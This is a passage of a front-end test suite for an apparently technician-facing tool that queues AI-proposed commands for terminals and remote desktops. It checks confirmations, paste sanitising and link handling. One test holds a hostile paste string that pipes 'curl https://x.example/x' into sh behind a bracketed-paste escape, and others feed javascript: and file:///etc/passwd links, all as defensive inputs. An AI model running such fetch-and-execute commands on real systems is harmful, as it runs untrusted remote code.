  // edited down to something short, the note goes
  laidOut(box, 600, 18);
  await app.type(box, "uptime");
  assert.equal(box.classList.contains("long"), false);
  assert.equal(sizeNote(app, 1), "");
  assert.equal(box.style.height, "20px");
});

test("the stylesheet never clips a command: its boxes scroll, the command column has a minimum width and the buttons wrap", () => {
  const css = fs.readFileSync(path.join(WEB, "style.css"), "utf8").replace(/\/\*[\s\S]*?\*\//g, "");
  const rule = (selector) => css.split("}").map((r) => r.split("{")).filter(([sel]) => sel.split(",").some((x) => x.trim() === selector))
    .map(([, body]) => body).join(";");
  for (const box of [".qitem .cmd", ".pcard .pcmd"]) {
    assert.doesNotMatch(rule(box), /overflow(-[xy])?\s*:\s*(hidden|clip)/, box);
    assert.match(rule(box), /overflow\s*:\s*auto/, box);
    assert.match(rule(box), /max-height\s*:\s*min\(400px, 60vh\)/, box);
    assert.match(rule(`${box}.long`), /overflow-y\s*:\s*scroll/, box);
  }
  assert.match(rule(".qitem"), /grid-template-columns:[^;]*minmax\(320px, 1fr\)[^;]*fit-content\(340px\)/);
  assert.match(rule(".qitem .actions"), /flex-wrap\s*:\s*wrap/);
  assert.match(css, /@media \(max-width: 1000px\)\s*{[^@]*\.qitem \.actions\s*{[^}]*grid-column:\s*2 \/ -1/);
});

test("Run and Insert type nothing from an emptied box: the item is skipped instead, and Escape brings its command back", async () => {
  const app = await page("a");
  termSocket(app).open();
  const box = cmdBox(app, 1);
  box.focus();
  await app.type(box, "   ");
  box.dispatchEvent(new Event("change"));
  await app.clock.tick(0);
  box.blur();
  assert.equal(box.classList.contains("empty"), true);
  assert.match(box.placeholder, /Run and Insert type nothing/);
  // a queue update doesn't put the command back behind the technician's back
  await app.event({ type: "queue", queue: state("a").queue });
  assert.equal(box.value, "   ");
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  button(row(app, 1), "Insert").click();
  await app.clock.tick(0);
  app.key(app.document.body, { key: "Enter", code: "Enter", ctrlKey: true, shiftKey: true });
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/1"), [], "nothing saved, nothing marked run");
  assert.deepEqual(app.terminals[0].pasted, []);
  assert.equal(app.toasts().filter((t) => /The command box of #1 is empty, so nothing was typed\. To leave the command out, skip the item/.test(t)).length, 3);
  // Escape: the saved command again, and Run types it
  assert.equal(app.key(box, { key: "Escape" }).defaultPrevented, true);
  assert.equal(box.value, "uptime");
  assert.equal(box.classList.contains("empty"), false);
  app.routes["POST /api/queue/1"] = () => ({ ok: true });
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["uptime"]);
});

test("an edit that isn't saved yet stays in its box through queue updates, and Run saves it first", async () => {
  const app = await page("a", null, { "POST /api/queue/1": (c) => (c.body.command ? { __status: 400, body: { error: "The server is busy." } } : { ok: true }) });
  termSocket(app).open();
  const box = cmdBox(app, 1);
  await app.type(box, "uptime -p");
  box.dispatchEvent(new Event("change"));           // the save fails
  await app.clock.tick(0);
  await app.event({ type: "queue", queue: state("a").queue });
  assert.equal(box.value, "uptime -p", "not overwritten with the saved command");
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, [], "Run doesn't type the command the box no longer shows");
  // saved now: the box follows the queue again
  app.routes["POST /api/queue/1"] = (c) => ({ item: { ...state("a").queue[0], command: c.body.command || "uptime -p", status: c.body.status || "pending" } });
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["uptime -p"]);
  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].command = "uptime -s"; }).queue });
  assert.equal(box.value, "uptime -s");
});

test("once saved, the box shows the command as the server keeps it, which is what Run types", async () => {
  const kept = { ...state("a").queue[0], command: "uptime -p", edited: true, hidden: ["removed 1× U+200B ZERO WIDTH SPACE"] };
  const app = await page("a", null, { "POST /api/queue/1": (c) => ({ ok: true, item: { ...kept, ...(c.body.status ? c.body : {}) } }) });
  termSocket(app).open();
  const box = cmdBox(app, 1);
  await app.type(box, "uptime\u200b -p  ");                // a zero-width space in it; not saved yet when Run is clicked
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.equal(box.value, "uptime -p");
  assert.deepEqual(app.terminals[0].pasted, ["uptime -p"]);
});

test("Run types the command the server recorded, and nothing if that isn't the one the technician was shown", async () => {
  const item = (change) => ({ ...state("a").queue[1], ...change });
  const app = await page("a", (s) => { s.queue[1].risk = "disruptive"; s.queue[1].risk_reasons = ["restarts a service"]; });
  termSocket(app).open();
  // while the confirmation is open, another window edits the item: the queue event arrives here
  button(row(app, 2), "Run").click();
  await app.clock.tick(50);
  assert.match(app.$(".modal .prompt-text").textContent, /systemctl reload nginx/);
  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[1].risk = "disruptive"; s.queue[1].command = "systemctl stop nginx"; }).queue });
  button(app.$(".modal"), "Run it").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/2"), [], "not even marked run");
  assert.deepEqual(app.terminals[0].pasted, []);
  assert.match(app.toasts().at(-1), /#2 changed while you were starting it, so nothing was typed\. Check it in the queue, then run it again\./);
  // the event hasn't arrived, but the server's answer to "ran" carries the item as it is there
  await app.event({ type: "queue", queue: state("a").queue });
  const answers = [() => ({ ok: true, item: item({ status: "ran", command: "systemctl stop nginx" }) }), () => ({ ok: true, item: item({ status: "pending" }) })];
  app.routes["POST /api/queue/2"] = (c) => answers.shift()(c);
  button(row(app, 2), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/2").map((c) => c.body), [{ status: "ran" }, { status: "pending" }], "put back to pending");
  assert.deepEqual(app.terminals[0].pasted, []);
  assert.equal(termSocket(app).sent.filter((m) => m.includes('"input"')).length, 0);
  // as shown: typed, from the server's answer
  app.routes["POST /api/queue/2"] = () => ({ ok: true, item: item({ status: "ran" }) });
  button(row(app, 2), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["systemctl reload nginx"]);
});

test("the session list goes back when the server refuses the change, and Run saves the list's session before it types", async () => {
  const two = (s) => { s.sessions.push({ ...s.sessions[0], id: "local-2" }); };
  const app = await page("a", two, { "POST /api/queue/1": () => ({ __status: 400, body: { error: "No such session." } }) });
  const sel = row(app, 1).querySelector(".sess");
  assert.equal(sel.getAttribute("aria-label"), "Session for #1");
  sel.value = "local-2";
  sel.dispatchEvent(new Event("change"));
  await app.clock.tick(0);
  assert.equal(sel.value, "local", "back on the session the item has");
  assert.match(app.toasts().at(-1), /No such session/);
  // the list changed and its save still on its way when Run is clicked: Run waits for the server's word
  for (const sid of ["local", "local-2"]) app.sockets.find((s) => s.url.includes(`/ws/term/${sid}`)).open();
  const saved = [];
  app.routes["POST /api/queue/1"] = (c) => { saved.push(c.body); return { ok: true, item: { ...state("a").queue[0], ...saved.reduce((a, b) => ({ ...a, ...b }), {}) } }; };
  sel.value = "local-2";
  button(row(app, 1), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(saved, [{ session_id: "local-2" }, { status: "ran" }]);
  assert.deepEqual(app.terminals.map((t) => t.pasted), [[], ["uptime"]]);
});

test("a click on Run that lands on a row which has only just moved there does nothing, and the row flashes", async () => {
  const app = await page("a", (s) => { s.chat = [{ kind: "assistant", text: "Start with these.", proposals: [3] }]; });
  for (const n of [2, 3, 4, 5]) app.routes[`POST /api/queue/${n}`] = () => ({ ok: true });
  termSocket(app).open();
  const place = (tops) => { for (const [n, top] of Object.entries(tops)) row(app, n).offsetTop = top; };
  place({ 1: 0, 2: 60, 3: 120, 4: 180 });
  app.call("noteRowsMoved");
  await app.clock.tick(1000);
  // the AI withdraws #1 as the pointer comes down on its Run: #2 is there now
  place({ 2: 0, 3: 60, 4: 120 });
  await app.event({ type: "queue", queue: state("a", (s) => { s.queue[0].status = "withdrawn"; }).queue });
  button(row(app, 2), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual([app.posts("/api/queue/2").length, app.terminals[0].pasted.length], [0, 0]);
  assert.equal(row(app, 2).classList.contains("moved"), true);
  button(row(app, 3), "Insert").click();                       // moved as well
  await app.clock.tick(399);
  assert.deepEqual(app.terminals[0].pasted, []);
  await app.clock.tick(1);
  button(row(app, 2), "Run").click();                          // it has been there a moment: meant
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["systemctl reload nginx"]);
  // a row that is new, where another was or none: the same
  await app.event({ type: "queue", queue: state("a", (s) => {
    s.queue[0].status = "withdrawn";
    s.queue[1].status = "ran";
    s.queue.push({ ...s.queue[3], num: 5, command: "id" });
  }).queue });
  button(row(app, 5), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/5"), []);
  // a row that stayed where it was takes the click at once
  button(row(app, 4), "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["systemctl reload nginx", "cat /etc/hostname"]);
  // a card in the chat, just redrawn under the pointer
  await app.clock.tick(1000);
  await app.event({ type: "chat", entry: { kind: "note", text: "Session local-2 opened." } });
  const card = app.$("#chat-log").querySelector(".pcard");
  button(card, "Run").click();
  await app.clock.tick(0);
  assert.deepEqual([app.posts("/api/queue/3").length, card.classList.contains("moved")], [0, true]);
  await app.clock.tick(400);
  button(card, "Run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted.at(-1), "df -h");
});

// ------------------------------------------------------------------ the clipboard and the connection

test("a copy that fails says so, and Copy to run doesn't mark the item run over the old clipboard", async () => {
  const app = await page("a", (s) => {
    s.sessions.push({ ...s.sessions[0], id: "win1", kind: "window", target: "ScreenConnect" });
    s.queue[0].session_id = "win1";
  }, { "POST /api/queue/1": (c) => ({ ok: true, item: { ...state("a").queue[0], session_id: "win1", ...c.body } }) });
  app.clipboard = "what was there before";
  app.clipboardFails = true;
  button(row(app, 3), "Copy").click();
  await app.clock.tick(0);
  assert.match(app.toasts().at(-1), /Nothing was copied: the clipboard couldn't be written to/);
  assert.ok(!app.toasts().includes("Command copied."));
  button(row(app, 1), "Copy to run").click();
  await app.clock.tick(50);
  button(app.$(".modal"), "Copy it").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/1"), [], "not marked run");
  assert.equal(app.clipboard, "what was there before");
  assert.equal(app.toasts().filter((t) => /Nothing was copied/.test(t)).length, 2);
  // the clipboard first, then the mark
  app.clipboardFails = false;
  app.routes["POST /api/queue/1"] = (c) => { assert.equal(app.clipboard, "uptime"); return { ok: true, item: { ...state("a").queue[0], session_id: "win1", ...c.body } }; };
  button(row(app, 1), "Copy to run").click();
  await app.clock.tick(0);
  assert.deepEqual(app.posts("/api/queue/1").map((c) => c.body), [{ status: "ran" }]);
  assert.match(app.toasts().at(-1), /#1 copied: paste it into win1/);
});

test("the page says when its connection to DA Toolkit is lost and when it is back, and stops at a token that is refused", async () => {
  const app = await page("a");
  const sockets = () => app.sockets.filter((s) => s.url.includes("/ws/events"));
  const banner = app.$("#conn-banner");
  assert.equal(banner.classList.contains("hidden"), true);
  sockets()[0].close();
  assert.equal(banner.classList.contains("hidden"), false);
  assert.match(banner.textContent, /connection to DA Toolkit is lost; reconnecting….*nothing can be run or sent until it is back/);
  await app.clock.tick(1500);
  assert.equal(sockets().length, 2);
  sockets()[1].open();
  assert.equal(banner.classList.contains("hidden"), true);
  // not running: asked again and again, with no socket opened to nothing
  app.routes["GET /api/phone"] = app.routes["POST /api/stop"] = () => { throw new TypeError("fetch failed"); };
  sockets()[1].close();
  await app.clock.tick(6000);
  assert.equal(sockets().length, 2);
  assert.equal(banner.classList.contains("hidden"), false);
  // a request made meanwhile fails in the technician's words
  await app.call("guarded", () => app.call("api", "POST", "/api/stop"));
  assert.match(app.toasts().at(-1), /DA Toolkit didn't answer: the connection to it is lost/);
  // started again: another token, so this page can never connect
  app.routes["GET /api/phone"] = () => ({ __status: 403, body: { detail: "bad token" } });
  await app.clock.tick(1500);
  assert.match(app.document.body.textContent, /DA Toolkit isn't open in this page\..*refused this page's access token: it has been started again/s);
  await app.clock.tick(20000);
  assert.equal(sockets().length, 2, "no more attempts");
});

test("a page opened with no token, or with one the server refuses, says so instead of showing an empty shell", async () => {
  const none = loadApp({ hash: "" });
  await none.clock.tick(0);
  assert.match(none.document.body.textContent, /DA Toolkit isn't open in this page\..*This address carries no access token/s);
  assert.deepEqual([none.sockets.length, none.calls.length], [0, 0]);
  const old = loadApp({ token: "of-an-earlier-run", routes: { "GET /api/phone": () => ({ __status: 403, body: { detail: "bad token" } }) } });
  await old.clock.tick(0);
  old.sockets[0].close();
  assert.match(old.document.body.textContent, /refused this page's access token/);
  await old.clock.tick(20000);
  assert.equal(old.sockets.length, 1);
});

test("a terminal's socket that drops is connected again, and the backlog the server replays is on the screen once", async () => {
  const app = await page("a");
  const term = app.terminals[0];
  const sockets = () => app.sockets.filter((s) => s.url.includes("/ws/term/local"));
  const bytes = (s) => new TextEncoder().encode(s).buffer;
  const screen = () => term.written.map((w) => (typeof w === "string" ? w : new TextDecoder().decode(w))).join("");
  sockets()[0].open();
  sockets()[0].receive(bytes("$ uptime\r\n up 3 days\r\n"));
  app.run("markOutput(S.terms.local, 1)");
  sockets()[0].close();
  assert.match(screen(), /connection to this session dropped; reconnecting/);
  assert.equal(app.run("S.terms.local.ws"), null);
  await app.clock.tick(1000);
  assert.equal(sockets().length, 2);
  sockets()[1].open();
  sockets()[1].receive(bytes("$ uptime\r\n up 3 days\r\n"));          // all the session has printed, again
  sockets()[1].receive(bytes("$ "));
  assert.equal(term.resets, 1);
  assert.equal(screen(), "$ uptime\r\n up 3 days\r\n$ ");
  assert.equal(app.run("S.terms.local.markers.size"), 0, "marks into the screen that was cleared are gone");
  assert.ok(app.run("S.terms.local.ws") === sockets()[1]);
  // the server not there: tried again, further and further apart
  sockets()[1].close();
  await app.clock.tick(1000);
  sockets()[2].close();
  await app.clock.tick(1999);
  assert.equal(sockets().length, 3);
  await app.clock.tick(1);
  assert.equal(sockets().length, 4);
  // a session that was closed is left alone
  await app.event({ type: "sessions", sessions: [] });
  await app.clock.tick(60000);
  assert.equal(sockets().length, 4);
});

test("a state that says the AI isn't answering clears the bubble of a reply whose end was missed", async () => {
  const app = await page("a");
  await app.event({ type: "turn_start", model: "m", tier: "standard" });
  await app.event({ type: "delta", kind: "text", text: "Half an ans" });
  await app.clock.tick(20);
  assert.match(app.$("#chat-log .msg.streaming").textContent, /Half an ans/);
  assert.equal(app.$("#stop-btn").classList.contains("hidden"), false);
  await app.event({ type: "state", state: state("a") });             // as a reconnection sends: not busy
  assert.equal(app.$("#chat-log .msg.streaming"), null);
  assert.equal(app.$("#stop-btn").classList.contains("hidden"), true);
  await app.event({ type: "delta", kind: "text", text: "wer" });      // a straggler draws nothing
  await app.clock.tick(20);
  assert.equal(app.$("#chat-log .msg.streaming"), null);
});

// ------------------------------------------------------------------ keys, terminals, remote desktops

test("Ctrl+Shift+C in a terminal copies its selection, and leaves the clipboard alone with none", async () => {
  const app = await page("a");
  const term = app.terminals[0];
  const press = () => term.keyHandler({ type: "keydown", key: "C", code: "KeyC", ctrlKey: true, shiftKey: true, preventDefault() {} });
  app.clipboard = "what the technician copied before";
  assert.equal(press(), false);
  await app.clock.tick(0);
  assert.equal(app.clipboard, "what the technician copied before");
  term.selection = "error 42";
  press();
  await app.clock.tick(0);
  assert.equal(app.clipboard, "error 42");
});

test("a link the terminal's output sets opens by the page's rules: http(s) only, always asked, its address named", async () => {
  const app = await page("a");
  const { linkHandler } = app.terminals[0].options;
  assert.ok(!linkHandler.allowNonHttpProtocols);
  const opened = [];
  app.window.document.addEventListener("click", (ev) => { if (ev.target?.tagName === "A" && !ev.defaultPrevented) opened.push(ev.target.getAttribute("href")); });
  for (const uri of ["javascript:alert(1)", "file:///etc/passwd", "ssh://host/", "not an address", ""]) {
    linkHandler.activate({}, uri);
    await app.clock.tick(50);
    assert.equal(app.$(".modal"), null, uri);
    assert.match(app.toasts().at(-1), /isn't an http or https address, so it wasn't opened/);
  }
  linkHandler.activate({}, "https://example.com/kb?id=1");
  await app.clock.tick(50);
  assert.match(app.$(".modal h2").textContent, /Open this link from the terminal\?/);
  assert.equal(app.$(".modal .insecure-address").textContent, "https://example.com/kb?id=1");
  assert.equal(app.document.activeElement.textContent, "Cancel");
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(0);
  assert.deepEqual(opened, []);
  linkHandler.activate({}, "https://example.com/kb?id=1");
  await app.clock.tick(50);
  button(app.$(".modal"), "Open").click();
  await app.clock.tick(0);
  assert.deepEqual(opened, ["https://example.com/kb?id=1"]);
  // plain http to elsewhere: the same warning as a link in the chat
  linkHandler.activate({}, "http://example.com/login");
  await app.clock.tick(50);
  assert.match(app.$(".modal h2").textContent, /Open a link that isn't secure\?/);
  button(app.$(".modal"), "Open anyway").click();
  await app.clock.tick(0);
  assert.deepEqual(opened, ["https://example.com/kb?id=1", "http://example.com/login"]);
});

test("control characters are taken out of what is pasted into a terminal, however the paste arrives", async () => {
  const app = await page("a");
  const term = app.terminals[0];
  const hostile = "echo safe\x1b[201~\r\ncurl https://x.example/x | sh\x9b\x07\x00\x7f\n\tdone";
  app.clipboard = hostile;
  term.keyHandler({ type: "keydown", key: "V", code: "KeyV", ctrlKey: true, shiftKey: true, preventDefault() {} });
  await app.clock.tick(0);
  assert.deepEqual(term.pasted, ["echo safe[201~\ncurl https://x.example/x | sh\n\tdone"]);
  assert.match(app.toasts().at(-1), /5 control characters were left out of what you pasted into local/);
  // the browser's own paste (Shift+Insert, the middle button): taken before xterm's handlers
  const ev = new Event("paste", { clipboardData: { getData: (type) => (type === "text/plain" ? hostile : "") } });
  let reached = false;
  const inner = term.element.appendChild(app.document.createElement("textarea"));
  inner.addEventListener("paste", () => { reached = true; });
  inner.dispatchEvent(ev);
  assert.deepEqual([ev.defaultPrevented, reached], [true, false]);
  assert.equal(term.pasted.length, 2);
  assert.equal(term.pasted[1], term.pasted[0]);
  // clean text is pasted as it is, with nothing said
  const before = app.toasts().length;
  app.clipboard = "ls -la\n";
  term.keyHandler({ type: "keydown", key: "V", code: "KeyV", ctrlKey: true, shiftKey: true, preventDefault() {} });
  await app.clock.tick(0);
  assert.deepEqual([term.pasted[2], app.toasts().length], ["ls -la\n", before]);
  // and a long unbroken tail of a command can't sit off-screen in a dialog that shows it
  assert.match(fs.readFileSync(path.join(WEB, "style.css"), "utf8"), /^\.prompt-text \{[^}]*overflow-wrap: anywhere/m);
});

test("messages name the Settings tab as it is labelled: AI providers", async () => {
  const js = fs.readFileSync(path.join(WEB, "app.js"), "utf8");
  assert.doesNotMatch(js, /Settings → Providers/);
  const app = await page("a");
  app.call("openSettings");
  await app.clock.tick(0);
  const tab = app.$(".modal .tabs-inline").querySelectorAll("button").find((b) => b.classList.contains("active"));
  assert.equal(tab.textContent, "AI providers");
  assert.ok(js.split("Settings → AI providers").length > 4);
});

test("a baseline's diff says which case, client and sensitivity the snapshot came from, when the server does", async () => {
  const diff = { host: "fs01", taken: "2026-11-01T10:00", changed: ["services"], same: ["disks"], text: "--- services" };
  const app = await page("a", null, { "POST /api/baselines/diff": () => ({ ...diff, case_name: "TKT-7 Acme fs01 slow", client: "Acme", sensitivity: "confidential" }) });
  await app.call("showBaselineDiff", { id: "local" }, "/b/1.json");
  const line = app.$(".modal .baseline-from");
  assert.equal(line.textContent, "Against the snapshot taken 2026-11-01T10:00 in the case “TKT-7 Acme fs01 slow” (client Acme) confidential. Changed: services. Unchanged: disks.");
  assert.equal(line.querySelector(".badge").getAttribute("class"), "badge confidential");
  button(app.$(".modal"), "Close").click();
  await app.clock.tick(0);
  app.routes["POST /api/baselines/diff"] = () => diff;              // an older server, or a baseline with no case
  await app.call("showBaselineDiff", { id: "local" }, "/b/1.json");
  assert.equal(app.$(".modal .baseline-from").textContent, "Against the snapshot taken 2026-11-01T10:00. Changed: services. Unchanged: disks.");
});

function fakeRdp(app, sid = "rdp1") {
  const log = [];
  app.run(`S.rdps[${JSON.stringify(sid)}] = { id: ${JSON.stringify(sid)}, state: 3, host: h("div"), view: h("div", { class: "rdp-view", tabindex: 0 }),
    fitBtn: h("button"), maxBtn: h("button"), status: h("span") };`);
  const r = app.run(`S.rdps[${JSON.stringify(sid)}]`);
  r.client = { sendKeyEvent: (down, key) => log.push([down, key]),
    getDisplay: () => ({ getScale: () => 1, getWidth: () => 0, getHeight: () => 0, scale() {} }) };
  r.keyboard = { reset: () => log.push("reset") };
  app.$("#terms").append(r.host);
  r.host.append(r.view);
  return { r, log };
}

test("texts typed into a remote desktop go one after another, each with the keys let go first", async () => {
  const app = await page("a");
  const { r, log } = fakeRdp(app);
  const keys = (s) => [...s].flatMap((c) => [[1, c.codePointAt(0)], [0, c.codePointAt(0)]]);
  const first = app.call("rdpType", r, "x".repeat(20), false);
  const second = app.call("rdpType", r, "ok", true);
  await app.clock.tick(100);
  await Promise.all([first, second]);
  assert.deepEqual(log, ["reset", ...keys("x".repeat(20)), "reset", ...keys("ok"), [1, 0xFF0D], [0, 0xFF0D]]);
  log.length = 0;
  r.state = 5;
  await assert.rejects(app.call("rdpType", r, "lost", false), /not connected/);
  r.state = 3;
  await app.call("rdpType", r, "y", false);
  assert.deepEqual(log, ["reset", ...keys("y")], "a failed text doesn't stop the next");
});

// A page whose first queue item is for a remote desktop that is connected.
async function rdpPage(command, routes = {}) {
  const app = await page("a", null, routes);
  const rdp = fakeRdp(app);
  const sessions = [...state("a").sessions, { ...state("a").sessions[0], id: "rdp1", kind: "rdp", target: "fs01", connected: true }];
  await app.event({ type: "sessions", sessions });
  await app.event({ type: "queue", queue: state("a", (s) => { Object.assign(s.queue[0], { session_id: "rdp1", command }); }).queue });
  app.routes["POST /api/queue/1"] ??= (c) => ({ ok: true, item: { ...state("a").queue[0], session_id: "rdp1", command, ...c.body } });
  return { app, ...rdp };
}
const ENTER = [[1, 0xFF0D], [0, 0xFF0D]];
const typed = (s) => [...s].flatMap((c) => (c === "\n" ? ENTER : [[1, c.codePointAt(0)], [0, c.codePointAt(0)]]));

test("a command with a tab in it is not typed into a remote desktop, where the tab would be the Tab key", async () => {
  const { app, r, log } = await rdpPage("Get-Content\tC:\\hosts");
  for (const label of ["Run", "Insert"]) {
    button(row(app, 1), label).click();
    await app.clock.tick(50);
    assert.equal(app.$(".modal"), null);
    assert.match(app.toasts().at(-1), /The command of #1 has a tab character in it, which can't be typed into a remote desktop: there it is the Tab key/);
  }
  assert.deepEqual(app.posts("/api/queue/1"), [], "not marked run");
  assert.deepEqual(log, []);
  // nor as text typed by hand, nor a control character: nothing of it is sent
  await assert.rejects(app.call("rdpType", r, "a\tb", false), /has a tab character in it/);
  await assert.rejects(app.call("rdpType", r, "a\x1b[201~b", false), /control characters/);
  assert.deepEqual(log, []);
});

test("Insert into a remote desktop asks before a command of several lines, every time: each line break is Enter there", async () => {
  const { app, r, log } = await rdpPage("Stop-Service spooler\nRemove-Item C:\\spool\\*\nStart-Service spooler");
  r.typedOk = true;                                             // this session has been typed into before
  button(row(app, 1), "Insert").click();
  await app.clock.tick(50);
  assert.match(app.$(".modal h2").textContent, /Insert will press Enter at each line break/);
  assert.match(app.$(".modal .warnbox").textContent, /This command has 3 lines\..*every line but the last runs as soon as it is typed/);
  assert.match(app.$(".modal .prompt-text").textContent, /Remove-Item/);
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(50);
  assert.deepEqual([app.posts("/api/queue/1").length, log.length], [0, 0]);
  button(row(app, 1), "Insert").click();
  await app.clock.tick(50);
  button(app.$(".modal"), "Type it, line breaks as Enter").click();
  await app.clock.tick(200);
  assert.deepEqual(app.posts("/api/queue/1").map((c) => c.body), [{ status: "inserted" }]);
  assert.deepEqual(log, ["reset", ...typed("Stop-Service spooler\nRemove-Item C:\\spool\\*\nStart-Service spooler")]);
  // one line: typed without a question, and no Enter
  const one = await rdpPage("hostname");
  one.r.typedOk = true;
  button(row(one.app, 1), "Insert").click();
  await one.app.clock.tick(50);
  assert.equal(one.app.$(".modal"), null);
  assert.deepEqual(one.log, ["reset", ...typed("hostname")]);
});

test("keys pressed in a remote desktop while a command is typed there are not sent into the middle of it", async () => {
  const app = await page("a");
  const { r, log } = fakeRdp(app);
  const typing = app.call("rdpType", r, "x".repeat(40), true);
  await app.clock.tick(15);                                     // 16 characters in: the technician hits a key
  app.call("rdpKey", r, 1, 0x61);
  app.call("rdpKey", r, 0, 0x61);
  await app.clock.tick(100);
  await typing;
  assert.deepEqual(log, ["reset", ...typed("x".repeat(40)), ...ENTER]);
  app.call("rdpKey", r, 1, 0x61);                               // typed: keys go through again
  assert.deepEqual(log.at(-1), [1, 0x61]);
  r.state = 5;
  app.call("rdpKey", r, 1, 0x62);
  assert.deepEqual(log.at(-1), [1, 0x61], "nothing to a desktop that isn't connected");
});

test("Run group always shows what it will type, and into which sessions, before it types anything", async () => {
  const grouped = (s) => { s.queue[0].group = s.queue[2].group = "g1"; };
  const app = await page("a", grouped, { "GET /api/queue/group/g1": () => ({ nums: [1, 3] }) });
  for (const n of [1, 3]) app.routes[`POST /api/queue/${n}`] = (c) => ({ ok: true, item: { ...state("a", grouped).queue[n - 1], ...c.body } });
  termSocket(app).open();
  button(row(app, 1), "Run group").click();
  await app.clock.tick(50);
  const items = app.$(".modal").querySelectorAll(".group-item");
  assert.match(app.$(".modal").textContent, /These 2 commands will be typed at the same moment, each into its session, with Enter/);
  assert.deepEqual(items.map((i) => i.querySelector(".prompt-text").textContent), ["uptime", "df -h"]);
  assert.deepEqual(items.map((i) => i.firstChild.textContent), ["#1 into local (local shell)", "#3 into local (local shell)"].map((t) => t.replace("local shell", state("a").sessions[0].target)));
  assert.deepEqual([app.posts("/api/queue/1").length, app.posts("/api/queue/3").length, app.terminals[0].pasted.length], [0, 0, 0]);
  button(app.$(".modal"), "Cancel").click();
  await app.clock.tick(50);
  assert.deepEqual(app.terminals[0].pasted, []);
  button(row(app, 1), "Run group").click();
  await app.clock.tick(50);
  button(app.$(".modal"), "Run all").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, ["uptime", "df -h"]);
  assert.deepEqual([app.posts("/api/queue/1").map((c) => c.body), app.posts("/api/queue/3").map((c) => c.body)], [[{ status: "ran" }], [{ status: "ran" }]]);
});

test("a group of which one item can't be started as shown types none of them", async () => {
  const grouped = (s) => { s.queue[0].group = s.queue[2].group = "g1"; };
  const app = await page("a", grouped, { "GET /api/queue/group/g1": () => ({ nums: [1, 3] }),
    "POST /api/queue/3": () => ({ __status: 400, body: { error: "#3 is withdrawn by the AI now, so it can't be marked ran; nothing was changed." } }) });
  app.routes["POST /api/queue/1"] = (c) => ({ ok: true, item: { ...state("a", grouped).queue[0], ...c.body } });
  termSocket(app).open();
  button(row(app, 1), "Run group").click();
  await app.clock.tick(50);
  button(app.$(".modal"), "Run all").click();
  await app.clock.tick(0);
  assert.deepEqual(app.terminals[0].pasted, []);
  assert.deepEqual(app.posts("/api/queue/1").map((c) => c.body), [{ status: "ran" }, { status: "pending" }], "the one that was marked is pending again");
  assert.match(app.toasts().at(-1), /#3 is withdrawn by the AI now/);
});

test("Alt+1 in a remote desktop switches tabs here and taps Ctrl there, so Windows opens no menu", async () => {
  const app = await page("a");
  const { r, log } = fakeRdp(app);
  app.run(`S.activeSid = "rdp1"`);
  const ev = app.key(r.view, { key: "1", code: "Digit1", altKey: true });
  assert.equal(ev.defaultPrevented, true);
  assert.deepEqual(log, [[1, 0xFFE3], [0, 0xFFE3]]);
  assert.equal(app.run("S.activeSid"), "local");
  r.state = 5;
  log.length = 0;
  app.run(`S.activeSid = "rdp1"`);
  app.key(r.view, { key: "1", code: "Digit1", altKey: true });
  assert.deepEqual(log, [], "nothing sent to a desktop that isn't connected");
});

// ------------------------------------------------------------------ the chat

test("links to pages a model or a search named are http(s) only", async () => {
  const app = await page("a");
  const a = app.call("extLink", "https://example.com/kb?id=1", "KB article");
  assert.deepEqual([a.tagName, a.getAttribute("href"), a.getAttribute("target"), a.getAttribute("rel"), a.textContent],
    ["A", "https://example.com/kb?id=1", "_blank", "noopener noreferrer", "KB article"]);
  for (const url of ["javascript:alert(1)", "data:text/html,<b>x</b>", "file:///etc/passwd", "", undefined]) {
    const el = app.call("extLink", url, "text");
    assert.deepEqual([el.tagName, el.getAttribute("href"), el.textContent], ["SPAN", null, "text"]);
  }
});

test("a TEE reply's mark says how far its check went, and anything short of verified says so", async () => {
  const app = await page("a");
  const mark = (result) => {
    const el = app.call("teeBadge", { tee_attested: "Intel TDX quote verified", tee_signature: result });
    return [el.textContent, el.getAttribute("class")];
  };
  assert.deepEqual(mark("verified"), ["🛡 TEE · ✔ verified", "tee-badge ok"]);
  assert.deepEqual(mark("signed"), ["🛡 TEE · signed, text not compared", "tee-badge "]);
  assert.deepEqual(mark("failed"), ["🛡 TEE · ✖ check failed", "tee-badge bad"]);
  assert.deepEqual(mark("unchecked"), ["🛡 TEE · ⚠ reply not verified", "tee-badge warn"]);
  assert.deepEqual(mark("unsigned"), ["🛡 TEE · unsigned", "tee-badge "]);
  assert.match(app.call("teeBadge", { tee_attested: "x", tee_signature: "verified" }).getAttribute("title"),
    /exact bytes this app received/);
});

test("a TEE model's tooltip names every key its replies are checked against", async () => {
  const app = await page("a");
  const title = (att) => app.call("attestLabel",
    { status: "verified", kind: "tee", level: "partial", summary: "s", detail: "d", ...att }).title;
  assert.match(title({ signing_address: "0xaa", signers: ["0xaa", "0xbb"] }), /\nReply-signing keys: 0xaa, 0xbb\n/);
  assert.match(title({ signing_address: "0xaa" }), /\nReply-signing key: 0xaa\n/);    // as attested before signers
  assert.match(title({ signers: ["0xbb"] }), /\nReply-signing key: 0xbb\n/);           // through the gateway alone
